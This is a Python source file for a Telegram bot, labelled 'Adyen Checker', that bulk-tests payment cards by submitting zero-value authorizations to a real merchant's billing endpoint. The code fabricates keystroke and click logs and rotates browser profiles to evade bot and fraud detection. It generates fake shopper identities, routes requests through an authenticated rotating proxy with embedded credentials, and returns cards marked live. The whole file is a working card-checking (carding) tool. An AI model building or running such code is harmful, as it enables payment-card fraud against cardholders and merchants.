import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
import psutil
import asyncio
from datetime import datetime
import io
import threading
import queue
from collections import defaultdict

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# Telegram Bot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ===================================================================
# === CONFIGURATION
# ===================================================================
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Thay bằng token bot của bạn

# Khóa để xử lý in ấn và ghi file an toàn trong đa luồng
print_lock = threading.Lock()
save_lock = threading.Lock()

# Biến global lưu trạng thái check
check_stats = defaultdict(lambda: {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'checked': 0,
    'start_time': 0,
    'live_cards': [],
    'die_cards': [],
    'running': False,
    'message_id': None,
    'chat_id': None
})

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    # Xử lý tháng
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    # Xử lý năm (chuyển 2 số thành 4 số)
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'


# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    """Tạo timestamp theo định dạng ISO 8601 UTC."""
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    """
    YÊU CẦU 2: Giả lập hành vi người dùng (Behavioral Biometrics)
    Tạo chuỗi log ngẫu nhiên gồm: fo (focus), cl (click), KN (keydown)
    """
    log_entries = []
    
    # Thời gian bắt đầu ngẫu nhiên (ms từ khi tải trang)
    current_time = random.randint(2000, 5000)
    
    # 1. Focus vào trường (fo)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    
    # 2. Click vào trường (cl)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    
    # 3. Gõ phím (KN - KeyDown) tương ứng độ dài input
    # Giả lập tốc độ gõ phím của người thật (khoảng 50-150ms mỗi phím)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180) # Khoảng cách giữa các phím
        
    return ",".join(log_entries)

def w(e):
    """Mã hóa base64 một chuỗi hoặc bytes."""
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    """Mã hóa base64 URL-safe."""
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    """Chuyển đổi chuỗi hex thành bytearray."""
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    """Ghi một số nguyên 32-bit vào bytearray."""
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        """Tạo đối tượng khóa RSA từ Adyen public key."""
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        
        part1 = parts[0]
        part2 = parts[1]
        
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)

        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        """Mã hóa dữ liệu sử dụng Adyen's CSE."""
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)

        random_bytes = os.urandom(64)
        
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        
        cek = random_bytes
        
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        
        aes_key = cek[32:]
        hmac_key = cek[:32]
        
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)

        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]

        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    """Định dạng số thẻ có dấu cách."""
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    """Chuẩn bị và mã hóa dữ liệu thẻ cho Adyen v4.8.0."""
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)

    # Tạo fake log động cho Number và CVC
    fake_number_log = generate_fake_log(16) # 16 ký tự thẻ
    fake_cvc_log = generate_fake_log(3)     # 3 ký tự CVC

    # Cập nhật card_detail với log động
    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": "3", 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE DESKTOP PROFILE (NEW - FIX FRAUD)
# ===================================================================

def generate_browser_profile():
    """
    Tạo giả lập Desktop Chrome Windows để tránh bị Adyen detect là Bot Mobile.
    Desktop profile ổn định hơn cho các request dạng web payment.
    """
    chrome_version = random.randint(120, 131)
    
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    """
    Tạo checkoutAttemptId ngẫu nhiên (UUID style) để tránh bị duplicate request check.
    """
    # Adyen ID thường có dạng UUID + base64 dài. Ta sẽ fake phần UUID đầu tiên.
    uuid_part = str(uuid.uuid4())
    # Phần đuôi giả lập hash
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 4: HÀM CHECK THẺ (WORKER)
# ===================================================================

def check_card_process(line_card, user_id):
    start_time = time.time()
    
    # Chuẩn hóa
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        check_stats[user_id]['error'] += 1
        check_stats[user_id]['checked'] += 1
        return

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        check_stats[user_id]['error'] += 1
        check_stats[user_id]['checked'] += 1
        return

    # Cấu hình API Key
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    # ================= RE-TRY LOGIC (MAX 20 LẦN) =================
    data = {}
    response_text = ""
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            # 1. Mã hóa
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            # 2. Tạo Profile Browser Desktop (Mới)
            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            
            city = 'New York' 
            
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            # 3. Gửi Curl
            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            # 4. Kiểm tra JSON
            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1)

    # ================= XỬ LÝ KẾT QUẢ =================
    
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    if not success_request:
        check_stats[user_id]['error'] += 1
        check_stats[user_id]['checked'] += 1
        return

    # Trích xuất dữ liệu
    additionalData = data.get('additionalData', {})
    
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    # Phân loại trạng thái
    if resultCode == "Authorised" or resultCode == "Cancelled":
        msg = "APPROVED ✅"
        check_stats[user_id]['live'] += 1
    elif resultCode == "Refused":
        msg = f"DIE - {refusalReason}"
        check_stats[user_id]['die'] += 1
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        msg = "3DS - 3D Secure required"
        check_stats[user_id]['die'] += 1
    else:
        msg = f"UNK - {message if message != 'N/A' else resultCode}"
        check_stats[user_id]['error'] += 1

    check_stats[user_id]['checked'] += 1

    # Định dạng chuỗi kết quả
    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|{time_taken}s"
    
    # Lưu vào list
    with save_lock:
        if "APPROVED" in msg:
            check_stats[user_id]['live_cards'].append(result_string)
        else:
            check_stats[user_id]['die_cards'].append(result_string)

# ===================================================================
# === PHẦN 5: QUẢN LÝ LUỒNG (THREADING)
# ===================================================================

def worker(q, user_id):
    while True:
        card = q.get()
        if card is None:
            break
        try:
            check_card_process(card, user_id)
        except Exception as e:
            check_stats[user_id]['error'] += 1
            check_stats[user_id]['checked'] += 1
        finally:
            q.task_done()

async def update_status_message(context: ContextTypes.DEFAULT_TYPE, user_id):
    """Cập nhật tin nhắn status mỗi 1 giây"""
    while check_stats[user_id]['running']:
        stats = check_stats[user_id]
        elapsed_time = time.time() - stats['start_time']
        
        # Tính CPM (Cards Per Minute)
        cpm = int((stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
        
        # Lấy CPU và RAM
        cpu_percent = psutil.cpu_percent(interval=0.1)
        ram_percent = psutil.virtual_memory().percent
        
        # Tạo progress bar
        progress = (stats['checked'] / stats['total'] * 100) if stats['total'] > 0 else 0
        bar_length = 20
        filled = int(bar_length * progress / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        status_text = f"""
╔══════════════════════════════════╗
║       🔄 CHECKING STATUS         ║
╠══════════════════════════════════╣
║ 📊 Progress: {progress:.1f}%
║ {bar}
║
║ 📈 Statistics:
║ ├─ Total: {stats['total']}
║ ├─ Checked: {stats['checked']}
║ ├─ ✅ Live: {stats['live']}
║ ├─ ❌ Die: {stats['die']}
║ └─ ⚠️ Error: {stats['error']}
║
║ ⚡ Performance:
║ ├─ CPM: {cpm} cards/min
║ ├─ CPU: {cpu_percent:.1f}%
║ ├─ RAM: {ram_percent:.1f}%
║ └─ Time: {int(elapsed_time)}s
╚══════════════════════════════════╝
        """
        
        try:
            if stats['message_id']:
                await context.bot.edit_message_text(
                    chat_id=stats['chat_id'],
                    message_id=stats['message_id'],
                    text=status_text,
                    parse_mode=ParseMode.HTML
                )
        except Exception as e:
            pass
        
        await asyncio.sleep(1)

# ===================================================================
# === TELEGRAM BOT HANDLERS
# ===================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /start"""
    welcome_text = """
╔══════════════════════════════════╗
║    👋 WELCOME TO ADYEN CHECKER   ║
╠══════════════════════════════════╣
║                                  ║
║ 📝 Commands:                     ║
║ /start - Hiển thị menu này       ║
║ /st <card> - Check một thẻ       ║
║                                  ║
║ 📤 Send File:                    ║
║ Gửi file .txt chứa list thẻ      ║
║ Format: cc|mm|yyyy|cvv           ║
║                                  ║
║ ⚡ Features:                     ║
║ - Check với 100 luồng            ║
║ - Real-time status updates       ║
║ - CPU/RAM monitoring             ║
║ - Auto export results            ║
║                                  ║
╚══════════════════════════════════╝
    """
    await update.message.reply_text(welcome_text)

async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /st để check một thẻ"""
    if not context.args:
        await update.message.reply_text("❌ Usage: /st <card>\nExample: /st 4532015112830366|12|2025|123")
        return
    
    card = ' '.join(context.args)
    user_id = update.effective_user.id
    
    # Reset stats
    check_stats[user_id] = {
        'total': 1,
        'live': 0,
        'die': 0,
        'error': 0,
        'checked': 0,
        'start_time': time.time(),
        'live_cards': [],
        'die_cards': [],
        'running': False,
        'message_id': None,
        'chat_id': update.effective_chat.id
    }
    
    msg = await update.message.reply_text("⏳ Checking card...")
    
    # Check thẻ
    check_card_process(card, user_id)
    
    stats = check_stats[user_id]
    time_taken = time.time() - stats['start_time']
    
    # Hiển thị kết quả
    if stats['live_cards']:
        result = stats['live_cards'][0]
        result_text = f"✅ LIVE CARD\n\n{result}"
    elif stats['die_cards']:
        result = stats['die_cards'][0]
        result_text = f"❌ DEAD CARD\n\n{result}"
    else:
        result_text = f"⚠️ ERROR\n\nCannot check this card"
    
    result_text += f"\n\n⏱ Time taken: {time_taken:.2f}s"
    
    await msg.edit_text(result_text)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý file được gửi"""
    import asyncio
    
    user_id = update.effective_user.id
    
    # Check nếu đang có process chạy
    if check_stats[user_id]['running']:
        await update.message.reply_text("❌ Bạn đang có một process đang chạy. Vui lòng đợi!")
        return
    
    # Download file
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    
    # Đọc cards
    cards = []
    try:
        content = file_content.decode('utf-8')
        cards = [line.strip() for line in content.split('\n') if line.strip()]
    except:
        await update.message.reply_text("❌ Không thể đọc file. Vui lòng gửi file .txt với encoding UTF-8")
        return
    
    if not cards:
        await update.message.reply_text("❌ File rỗng hoặc không có thẻ hợp lệ")
        return
    
    # Reset stats
    check_stats[user_id] = {
        'total': len(cards),
        'live': 0,
        'die': 0,
        'error': 0,
        'checked': 0,
        'start_time': time.time(),
        'live_cards': [],
        'die_cards': [],
        'running': True,
        'message_id': None,
        'chat_id': update.effective_chat.id
    }
    
    # Gửi message status
    status_msg = await update.message.reply_text("🚀 Starting checker with 100 threads...")
    check_stats[user_id]['message_id'] = status_msg.message_id
    
    # Bắt đầu update status thread
    asyncio.create_task(update_status_message(context, user_id))
    
    # Tạo queue và workers
    q = queue.Queue()
    threads = []
    num_threads = 100
    
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(q, user_id))
        t.start()
        threads.append(t)
    
    # Đẩy cards vào queue
    for card in cards:
        q.put(card)
    
    # Chờ xử lý xong
    q.join()
    
    # Dừng workers
    for i in range(num_threads):
        q.put(None)
    for t in threads:
        t.join()
    
    # Dừng update status
    check_stats[user_id]['running'] = False
    
    # Tạo file kết quả
    stats = check_stats[user_id]
    total_time = time.time() - stats['start_time']
    
    # File LIVE
    live_filename = f"live_{user_id}_{int(time.time())}.txt"
    with open(live_filename, 'w', encoding='utf-8') as f:
        for card in stats['live_cards']:
            f.write(card + '\n')
    
    # File DIE
    die_filename = f"die_{user_id}_{int(time.time())}.txt"
    with open(die_filename, 'w', encoding='utf-8') as f:
        for card in stats['die_cards']:
            f.write(card + '\n')
    
    # Gửi summary
    summary = f"""
╔══════════════════════════════════╗
║       ✅ CHECK COMPLETED          ║
╠══════════════════════════════════╣
║ 📊 Final Statistics:
║ ├─ Total: {stats['total']}
║ ├─ ✅ Live: {stats['live']}
║ ├─ ❌ Die: {stats['die']}
║ └─ ⚠️ Error: {stats['error']}
║
║ ⏱ Time: {int(total_time)}s
║ 📈 AVG: {(stats['total']/total_time):.2f} cards/s
╚══════════════════════════════════╝
    """
    
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=status_msg.message_id,
        text=summary
    )
    
    # Gửi files
    if stats['live_cards']:
        await update.message.reply_document(
            document=open(live_filename, 'rb'),
            filename=live_filename,
            caption=f"✅ LIVE Cards ({stats['live']})"
        )
        os.remove(live_filename)
    
    if stats['die_cards']:
        await update.message.reply_document(
            document=open(die_filename, 'rb'),
            filename=die_filename,
            caption=f"❌ DIE Cards ({stats['die']})"
        )
        os.remove(die_filename)

def main():
    """Main function"""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Vui lòng thay thế YOUR_BOT_TOKEN_HERE bằng bot token của bạn!")
        print("Lấy token tại: https://t.me/BotFather")
        sys.exit(1)
    
    print("🤖 Starting Telegram Bot...")
    print("Bot is running. Press Ctrl+C to stop.")
    
    # Tạo application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("st", check_single_card))
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_file))
    
    # Chạy bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
